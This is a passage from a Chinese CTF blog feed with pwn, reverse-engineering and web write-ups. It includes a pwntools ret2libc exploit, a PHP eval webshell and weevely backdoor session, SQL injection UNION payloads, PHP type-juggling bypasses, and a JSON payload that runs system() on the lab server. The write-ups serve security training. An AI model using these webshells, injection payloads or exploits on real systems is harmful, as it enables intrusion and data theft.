corruption (out)</span><br><span class="line">Aborted</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/a0edc8cf/">https://noone-hub.github.io/posts/a0edc8cf/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>idea</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>tjctf2019比赛</title>
    <url>/posts/46708f4d/</url>
    <content><![CDATA[<h1 id="Printf"><a href="#Printf" class="headerlink" title="Printf"></a>Printf</h1><p>Welcome to the brand new Security Consultants Inc. portal!<br>What would you like to do?<br>1.) View the Team!<br>2.) Check the date.<br>3.) Sign up for our newsletter!<br>4.) Report a bug.<br>x.) Exit.<br>Thanks for signing up for our newsletter!<br>Please enter your email address below:<br>I have your email as:<br>sh;# � �aaaaaaaJ `sh: 1: Is: not found<br>$<br>Great! I have your information down as:<br>Name: Evan Shi<br>sh: 1: Email:: not found<br>$ cat flag.txt<br>tjctf{p0lygl0t_m0r3_l1k3_p0lynot}$</p><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/46708f4d/">https://noone-hub.github.io/posts/46708f4d/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>随便做的练习</title>
    <url>/posts/8cd80461/</url>
    <content><![CDATA[<h1 id="writeup-1-练习"><a href="#writeup-1-练习" class="headerlink" title="writeup-1-练习"></a>writeup-1-练习</h1><h2 id="简单的re"><a href="#简单的re" class="headerlink" title="简单的re"></a>简单的re</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+0h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+60h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+68h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  _printf_chk(<span class="number">1L</span>L, <span class="string">"input:"</span>, envp);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v10, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;v10);</span><br><span class="line">  v3 = <span class="number">34</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (<span class="keyword">int</span> *)&amp;v10;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = *v5;</span><br><span class="line">      ++v5;</span><br><span class="line">      v7 = ~v6 &amp; (v6 - <span class="number">16843009</span>) &amp; <span class="number">0x80808080</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !v7 );</span><br><span class="line">    <span class="keyword">if</span> ( !(~v6 &amp; (v6 - <span class="number">16843009</span>) &amp; <span class="number">0x8080</span>) )</span><br><span class="line">      v7 &gt;&gt;= <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !(~v6 &amp; (v6 - <span class="number">16843009</span>) &amp; <span class="number">0x8080</span>) )</span><br><span class="line">      v5 = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)v5 + <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= (<span class="keyword">char</span> *)v5 - __CFADD__((_BYTE)v7, (_BYTE)v7) - <span class="number">3</span> - (<span class="keyword">char</span> *)&amp;v10 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *((_BYTE *)&amp;v10 + i) ^= v3++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;szCmp, &amp;v10, <span class="number">0x16</span>uLL) )</span><br><span class="line">    _printf_chk(<span class="number">1L</span>L, <span class="string">"right\n"</span>, v8);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    _printf_chk(<span class="number">1L</span>L, <span class="string">"wrong\n"</span>, v8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><p>刚看以为很复杂，后面发觉前面的都是校验，只要异或下就可以了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">List = [<span class="number">0x44</span>, <span class="number">0x4F</span>, <span class="number">0x45</span>, <span class="number">0x42</span>, <span class="number">0x5D</span>, <span class="number">0x1E</span>, <span class="number">0x1B</span>, <span class="number">0x19</span>, <span class="number">0x43</span>, <span class="number">0x7E</span>, <span class="number">0x61</span>, <span class="number">0x1F</span>, <span class="number">0x61</span>, <span class="number">0x59</span>, <span class="number">0x7B</span>, <span class="number">0x76</span>, <span class="number">0x78</span>, <span class="number">0x65</span>, <span class="number">0x0C</span>, <span class="number">0x03</span>, <span class="number">0x41</span>, <span class="number">0x4A</span>]</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(List)):</span><br><span class="line">    flag += chr(List[i]^(<span class="number">0x22</span>+i))</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+60h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input your name:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"hi,%s welcome to shanxi~!\n"</span>, &amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单的栈溢出，64位，开头ropgadget坏了，折腾了一小会，然后exp很简单</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'pwn'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">host = <span class="string">'123.59.204.3'</span></span><br><span class="line">port = <span class="number">3333</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = process(<span class="string">"./pwn"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">    pop_rdi = <span class="number">0x0000000000400863</span></span><br><span class="line">    puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    ret_addr = <span class="number">0x0000000000400776</span></span><br><span class="line">    offset = <span class="number">120</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">120</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(ret_addr)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(<span class="string">"welcome to shanxi~!\n"</span>)</span><br><span class="line">    puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh_addr = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">120</span> + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/8cd80461/">https://noone-hub.github.io/posts/8cd80461/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn， 栈</tag>
      </tags>
  </entry>
  <entry>
    <title>linux qq测试</title>
    <url>/posts/d100f3b8/</url>
    <content><![CDATA[<h1 id="tencentqq"><a href="#tencentqq" class="headerlink" title="tencentqq"></a>tencentqq</h1><p>installing /usr/share/applications/qq.desktop<br>installing /usr/share/tencent-qq/qq<br>installing /usr/share/tencent-qq/qq.png<br>installing /usr/share/tencent-qq/qq.bmp<br>installing /usr/share/tencent-qq/res.db<br>installing /usr/share/tencent-qq/crashpad_handler</p><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/d100f3b8/">https://noone-hub.github.io/posts/d100f3b8/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>linux,测试</tag>
      </tags>
  </entry>
  <entry>
    <title>web安全训练</title>
    <url>/posts/f605762/</url>
    <content><![CDATA[<h1 id="安恒训练赛"><a href="#安恒训练赛" class="headerlink" title="安恒训练赛"></a>安恒训练赛</h1><h2 id="常规操作"><a href="#常规操作" class="headerlink" title="常规操作"></a>常规操作</h2><p><span class="exturl" data-url="aHR0cDovLzExNC41NS4zNi42OTo4MDA5L2luZGV4LnBocD91cmw9dXBsb2Fk" title="http://114.55.36.69:8009/index.php?url=upload">http://114.55.36.69:8009/index.php?url=upload<i class="fa fa-external-link"></i></span></p><p>upload很明显的文件上传，查了下是php伪协议<br>看到zip于是猜测是phar://伪协议读取。</p><p>于是写个小马打包成zip文件传上去。</p><p>例如我写的是south.php。</p><p>然后压缩成south.zip，那么需要访问以下链接。</p><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --> <?php
    @eval($_POST['south']);
    ?> <p>upload/5a722d46033ecd25d5ce0f13a0e7d8ec.zip/south<br><span class="exturl" data-url="aHR0cDovLzExNC41NS4zNi42OTo4MDA5L2luZGV4LnBocD91cmw9cGhhcjovL3VwbG9hZC8xM2Q5ODM4OGZiZjdhMDM5N2RlODdlZTM2NTgzMGRmOC56aXAvdGVzdA==" title="http://114.55.36.69:8009/index.php?url=phar://upload/13d98388fbf7a0397de87ee365830df8.zip/test">http://114.55.36.69:8009/index.php?url=phar://upload/13d98388fbf7a0397de87ee365830df8.zip/test<i class="fa fa-external-link"></i></span><br>随后连接小马，读到flag{a5aa012546a729eebaeaa768883beb23}。</p><p>weevely generate<password><path></path></password></p><p>weevely generate test ./test.php<br>生成小马</p><p>然后压缩<br>zip test.zip test.php</p><p>然后上传得到了个路径<br>/var/www/html/upload/db29bc3f2a4be40c202cd7de760f41d6.zip<br>/upload/30a95552d102e69505b406933e4332f5.zip</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌─[root@parrot]─[/home/NoOne]</span><br><span class="line">└──╼ <span class="comment">#weevely http://114.55.36.69:8009/index.php?url=phar://upload/a382c5d906587c695f4408c0c7491560.zip/test test</span></span><br><span class="line">/usr/share/weevely/core/sessions.py:219: YAMLLoadWarning: calling yaml.load() without Loader=... is deprecated, as the default Loader is unsafe. Please <span class="built_in">read</span> https://msg.pyyaml.org/load <span class="keyword">for</span> full details.</span><br><span class="line">  sessiondb = yaml.load(open(dbpath, <span class="string">'r'</span>).<span class="built_in">read</span>())</span><br><span class="line"></span><br><span class="line">[+] weevely 3.7.0</span><br><span class="line"></span><br><span class="line">[+] Target:	c23cc37b6623:/var/www/html</span><br><span class="line">[+] Session:	/root/.weevely/sessions/114.55.36.69/index_4.session</span><br><span class="line">[+] Shell:	System shell</span><br><span class="line"></span><br><span class="line">[+] Browse the filesystem or execute commands starts the connection</span><br><span class="line">[+] to the target. Type :<span class="built_in">help</span> <span class="keyword">for</span> more information.</span><br><span class="line"></span><br><span class="line">weevely&gt; ls</span><br><span class="line">flag.php</span><br><span class="line">girl.jpg</span><br><span class="line">index.php</span><br><span class="line">upload</span><br><span class="line">upload.php</span><br><span class="line">c23cc37b6623:/var/www/html $ cat flag.php</span><br><span class="line">&lt;?php</span><br><span class="line">//flag&#123;a5aa012546a729eebaeaa768883beb23&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cDovLzExNC41NS4zNi42OTo4MDA5L2luZGV4LnBocD91cmw9cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1mbGFn" title="http://114.55.36.69:8009/index.php?url=php://filter/convert.base64-encode/resource=flag">http://114.55.36.69:8009/index.php?url=php://filter/convert.base64-encode/resource=flag<i class="fa fa-external-link"></i></span></p><h2 id="简单的md5"><a href="#简单的md5" class="headerlink" title="简单的md5"></a>简单的md5</h2><p>简单的md5 <span class="exturl" data-url="aHR0cDovLzExNC41NS4zNi42OTo4MDA0" title="http://114.55.36.69:8004">http://114.55.36.69:8004<i class="fa fa-external-link"></i></span></p><p>easy MD5 cracking</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--$_POST[<span class="string">'data1'</span>]!=$_POST[<span class="string">'data2'</span>]--&gt;fail</span><br></pre></td></tr></table></figure><p>没有md5?应该是只有部分代码</p><p>脑补一下剩下的代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(($_POST[<span class="string">'data1'</span>]!=$_POST[<span class="string">'data2'</span>])</span><br><span class="line">&amp;&amp;(md5($_POST[<span class="string">'data1'</span>])==md5($_POST[<span class="string">'data2'</span>]))</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br></pre></td></tr></table></figure><p>这里用php弱类型绕过就好了<br>传错类型会变成null，所以可以绕过</p><p><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zMDMyMzQ5OQ==" title="https://zhuanlan.zhihu.com/p/30323499">https://zhuanlan.zhihu.com/p/30323499<i class="fa fa-external-link"></i></span></p><p>data1[]=1 &amp;&amp; data2[]=2</p><p>flag{401cf19d304e557349fecda18110c138}</p><h2 id="简单的新闻搜索"><a href="#简单的新闻搜索" class="headerlink" title="简单的新闻搜索"></a>简单的新闻搜索</h2><p>简单的新闻搜索网站 <span class="exturl" data-url="aHR0cDovLzExNC41NS4zNi42OTo4MDEw" title="http://114.55.36.69:8010">http://114.55.36.69:8010<i class="fa fa-external-link"></i></span></p><p>小知识点：union需要前面的列数跟后面的列数相同，所以少了用数字补</p><p>burp</p><p>注入表名</p><p>word=1%’ union select 1,2,table_name from information_schema.tables where table_schema=database()– &amp;number=5</p><p>注入得到列名</p><p>word=1%’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’admin’– &amp;number=5</p><p>得到flag<br>word=1%’ union select 1,2,flag from admin– &amp;number=5</p><h2 id="奇怪的恐龙特性"><a href="#奇怪的恐龙特性" class="headerlink" title="奇怪的恐龙特性"></a>奇怪的恐龙特性</h2><p>大约在15亿年前，生活在地球上的恐龙中有一种很奇怪的恐龙，他们有一种奇怪的特性，那就是当在捕杀猎物的时候，如果猎物发出惊讶的表情的时候，他们也会发出惊讶的表情来告诉猎物“你们快要死了”，然而这种特性并没什么用处。。。因为我编不下去了。。以上这个故事是我瞎编的。。。靶机：<span class="exturl" data-url="aHR0cDovLzExNC41NS4zNi42OTo4MDIy" title="http://114.55.36.69:8022">http://114.55.36.69:8022<i class="fa fa-external-link"></i></span></p><p>当传入A.A、A[A或者A A时，PHP的$GET函数会自动将[.和空格转为_<br>这道题测试+也是可以绕过<br>数组大于任意的数字，字符串中如果没有数字，则==0</p><p>A.A[]=1</p><h2 id="md5-crack"><a href="#md5-crack" class="headerlink" title="md5 crack"></a>md5 crack</h2><p>fastcoll.exe -p 1.txt -o 1.bin 2.bin</p><p>py读取二进制流在urlencode一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">f1 = open(<span class="string">'1.bin'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">f2 = open(<span class="string">'2.bin'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'data1'</span>:f1,</span><br><span class="line">    <span class="string">'data2'</span>:f2</span><br><span class="line">&#125;</span><br><span class="line">print(urllib.parse.quote(f1))</span><br><span class="line">print(urllib.parse.quote(f2))</span><br><span class="line">flag = requests.post(<span class="string">"http://114.55.36.69:8006"</span>, data=data)</span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure><p>然后通过burp或者py都可以直接获得flag</p><p>这里用hackbar会变成二次url编码，然后会出问题</p><h2 id="新的新闻搜索"><a href="#新的新闻搜索" class="headerlink" title="新的新闻搜索"></a>新的新闻搜索</h2><p>word=%’and 1=2 /<em>!32302union</em>/ /<em>!32302select</em>/ 1,2,flag from admin#&amp;number=5</p><p>有点骚，这个操作，内联注释绕过，虽然不知道原理，还是学到了</p><p>注释是c语言注释格式/* */ !和数字，这个数字不能太小</p><p>。。flag不对。。</p><h2 id="玩个蛇皮"><a href="#玩个蛇皮" class="headerlink" title="玩个蛇皮"></a>玩个蛇皮</h2><p>玩个蛇皮 <span class="exturl" data-url="aHR0cDovLzExNC41NS4zNi42OTo4MDEx" title="http://114.55.36.69:8011">http://114.55.36.69:8011<i class="fa fa-external-link"></i></span><br>简单js执行命令即可</p><h2 id="ddcms"><a href="#ddcms" class="headerlink" title="ddcms"></a>ddcms</h2><p>查看默认管理后端<br>弱口令，传小马，连上拿flag</p><p>1de3ce6607a0f95as1861c4bbb3687b8</p><h2 id="爱い窒息、痛"><a href="#爱い窒息、痛" class="headerlink" title="爱い窒息、痛"></a>爱い窒息、痛</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">isset</span>($_POST[<span class="string">'pass'</span>]) ? trim($_POST[<span class="string">'pass'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ($a == <span class="string">''</span>) &#123;</span><br><span class="line">    echologin();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    chkpass($a);</span><br><span class="line">    helloowner($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chkpass</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>], md5($a)) === <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">helloowner</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    $b = gencodeurl($a);</span><br><span class="line">    $c = file_get_contents($b);</span><br><span class="line">    <span class="keyword">if</span> ($c == <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d = @json_decode($c, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($d[<span class="string">'f'</span>])) &#123;</span><br><span class="line">        echofail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d[<span class="string">'f'</span>]($d[<span class="string">'d'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gencodeurl</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    $e = md5(date(<span class="string">"Y-m-d"</span>));</span><br><span class="line">    <span class="keyword">if</span> (strlen($a) &gt; <span class="number">40</span>) &#123;</span><br><span class="line">        $f = substr($a, <span class="number">30</span>, <span class="number">5</span>);</span><br><span class="line">        $g = substr($a, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $f = <span class="string">'good'</span>;</span><br><span class="line">        $g = <span class="string">'web.com'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $b = <span class="string">'http://'</span> . $f . $g;</span><br><span class="line">    <span class="keyword">return</span> $b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echofail</span><span class="params">($h)</span> </span>&#123;</span><br><span class="line">    $i = <span class="string">'PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiLz48dGl0bGU+54ix44GE56qS5oGv44CB55ebPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9IndpZHRoOiAzMGVtO21hcmdpbjogMWVtIGF1dG87dGV4dC1hbGlnbjogY2VudGVyOyI+PHAgZXJyaWQ9IiVpZCUiPuKFoS3jgIDjgIDilbAg5b+r55yL44CB5pyJ54Gw5py644CB5Zyo5rK15aS05LiK54Gw5p2l54Gw5Y6755qE44CCPC9wPjxwIHN0eWxlPSJmb250LXNpemU6IDUwJTsiPjxhIGhyZWY9Imh0dHBzOi8vd3d3LmxvdmVzdG9wcGFpbi50a0BibG9nLnZ1bHNweS5jb20vIj7niLHjgYTnqpLmga/jgIHnl5s8L2E+IOS4k+eUqOWQjumXqDwvcD48L2JvZHk+PC9odG1sPg=='</span>;</span><br><span class="line">    <span class="keyword">echo</span> str_replace(<span class="string">'%id%'</span>, $h, base64_decode($i));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echologin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $j = <span class="string">'PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiLz48dGl0bGU+54ix44GE56qS5oGv44CB55ebPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9IndpZHRoOiAyMGVtO21hcmdpbjogMWVtIGF1dG87dGV4dC1hbGlnbjogY2VudGVyOyI+PGZvcm0gYWNpdG9uPSIiIG1ldGhvZD0iUE9TVCI+PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzIiBwbGFjZWhvbGRlcj0icGFzcyI+PGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0ic3VibWl0Ij48L2Zvcm0+PHAgc3R5bGU9ImZvbnQtc2l6ZTogNTAlOyI+PGEgaHJlZj0iaHR0cHM6Ly93d3cubG92ZXN0b3BwYWluLnRrQGJsb2cudnVsc3B5LmNvbS8iPueIseOBhOeqkuaBr+OAgeeXmzwvYT4g5LiT55So5ZCO6ZeoPC9wPjwvYm9keT48L2h0bWw+'</span>;</span><br><span class="line">    <span class="keyword">echo</span> base64_decode($j);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码审计，发觉可以命令执行</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'ip地址'</span>.ljust(<span class="number">15</span>, <span class="string">'/'</span>)</span><br><span class="line">addr = <span class="string">'a'</span>*<span class="number">10</span> + ip[<span class="number">-10</span>:] + <span class="string">'b'</span>*<span class="number">10</span> + ip[:<span class="number">5</span>] + <span class="string">"c"</span>*<span class="number">10</span></span><br><span class="line">print(addr)</span><br><span class="line">print(len(addr))</span><br><span class="line">md5 = hashlib.md5(addr.encode(<span class="string">'ascii'</span>)).hexdigest()</span><br><span class="line">print(md5)</span><br><span class="line">http_addr = <span class="string">"http://"</span> + addr</span><br><span class="line">print(http_addr)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /upload/dama.php HTTP/1.1</span><br><span class="line">Host: 114.55.36.69:8020</span><br><span class="line">User-Agent:md5</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh,en-US;q=0.7,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 64</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://114.55.36.69:8020/upload/dama.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">pass=aaaaaaaaaaxxxxxx///bbbbbbbbbbxxxxcccccccccc&amp;submit=submit</span><br></pre></td></tr></table></figure><p>部署在服务器上，默认以80端口，这样就不用index.php了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"f"</span>=&gt;<span class="string">"system"</span>,</span><br><span class="line">    <span class="string">"d"</span>=&gt;<span class="string">"cat ../flag.php"</span></span><br><span class="line">);</span><br><span class="line">$url = json_encode($url);</span><br><span class="line"><span class="keyword">echo</span> $url;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/f605762/">https://noone-hub.github.io/posts/f605762/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>web安全,练习</tag>
      </tags>
  </entry>
  <entry>
    <title>web安全学习</title>
    <url>/posts/b14814c4/</url>
    <content><![CDATA[<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>john –format=raw-MD5 1.txt<br>破解hash值</p><p>二次执行<br>删除 ~/.john</p><p>john –format=raw-MD5 1.txt –show 可以展示以前破解的密码</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/b14814c4/">https://noone-hub.github.io/posts/b14814c4/</a><br><strong>版权声明</strong>：转载请注明出处！</p>]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web安全,sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>python爬虫学习1</title>
    <url>/posts/3e78770/</url>
